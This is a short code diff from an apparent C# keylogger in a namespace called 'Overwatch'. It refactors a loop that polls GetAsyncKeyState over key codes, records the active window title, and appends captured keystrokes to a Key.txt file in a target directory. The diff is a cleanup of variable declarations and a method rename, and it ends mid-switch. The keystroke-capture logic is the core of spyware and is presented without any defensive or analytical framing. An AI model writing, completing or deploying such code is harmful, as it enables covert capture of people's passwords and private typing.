@@ -25,17 +25,12 @@ namespace Overwatch
 
         private const int MAX_STRING_BUILDER = 256;
         private const bool DEBUG = true;
-        private StreamWriter writer;
-        string path;
-        internal void start()
+        internal void Start()
         {
-            path = appConfing.targetDirPath+"\\Key.txt";
-            Console.WriteLine(path);
-            Keys key;
-            using (writer = new StreamWriter(path, true))
+            string path = appConfing.targetDirPath+"\\Key.txt";
+            using (StreamWriter writer = new StreamWriter(path, true))
             {
-                string lastWindowText = "";
-                string tempWindowText = "";
+                string tempWindowText, lastWindowText = "";
                 while (true)
                 {
                     for (Int32 i = 0; i < 1000; i++)
@@ -49,7 +44,7 @@ namespace Overwatch
                         int value = GetAsyncKeyState(i);
                         if ((value & 0x8000) == 0 || (value & 0x1) == 0)
                             continue;
-                        key = (Keys)i;
+                        Keys key = (Keys)i;
                         switch (key)
                         {
                             case Keys.LButton:
